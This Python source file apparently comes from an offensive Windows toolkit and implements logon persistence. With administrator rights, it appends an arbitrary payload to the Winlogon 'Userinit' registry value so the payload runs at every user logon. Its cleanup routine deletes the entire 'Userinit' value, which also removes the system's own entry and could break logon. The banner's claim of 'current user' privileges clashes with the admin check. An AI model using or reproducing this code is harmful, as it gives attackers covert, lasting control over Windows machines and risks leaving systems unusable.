import os
import wmi
import ctypes
import _winreg
from core.prints import *

wmi = wmi.WMI()
	
def system_directory():
	for os in wmi.Win32_OperatingSystem():
		return os.SystemDirectory
	
def reg_delete(path):
	try:
		key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path),0,_winreg.KEY_ALL_ACCESS)
		_winreg.DeleteValue(key,"Userinit")
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True

def reg_create(path,payload):
	try:
		key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path),0,_winreg.KEY_ALL_ACCESS)
		_winreg.SetValueEx(key,"Userinit",0,_winreg.REG_SZ,os.path.join(system_directory(),"userinit.exe," + payload))
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True

def userinit_delete():
	"""
	Delete persistence by calling this function
	"""
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		if (reg_delete("Software\Microsoft\Windows NT\CurrentVersion\Winlogon") == True):
			print_success("Successfully deleted persistence key")
		else:
			print_error("Unable to delete persistence key")
			return False
	else:
		print_error("Unable to delete persistence, we are not elevated")
		return False
		
def userinit(payload):
	print """
 -------------------------------------------------------------
 Persistence technique using Userinit registry key to add
 more executables to startup
 
 When everything worked correctly, we should gain persistence
 with current user privledges.
 -------------------------------------------------------------
 """
	print_info("Payload: {}".format(payload))

	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		if (reg_create("Software\Microsoft\Windows NT\CurrentVersion\Winlogon",payload) == True):
			print_success("Successfully created persistence key")
		else:
			print_error("Unable to create persistence key")
			return False
	else:
		print_error("Unable to create or modify Userinit key, we are not elevated")
		return False